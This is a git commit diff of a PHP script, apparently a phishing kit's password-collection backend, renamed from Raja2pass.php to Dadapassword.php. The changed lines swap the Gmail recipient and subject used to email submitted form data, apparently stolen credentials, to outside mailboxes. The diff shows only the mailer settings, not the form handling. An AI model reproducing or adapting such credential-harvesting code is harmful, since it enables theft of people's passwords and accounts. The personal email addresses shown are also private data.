d7d526519b29d12c2f25d2c006795240b50565a1
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-08 19:56:01 +0500

    Update and rename Raja2pass.php to Dadapassword.php

--- api/Dadapassword.php
+++ api/Dadapassword.php
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
-        $mail->addAddress('lisakudrow339@gmail.com');
+        $mail->addAddress('officialw224@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'raja2';
+        $mail->Subject = 'Dada';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
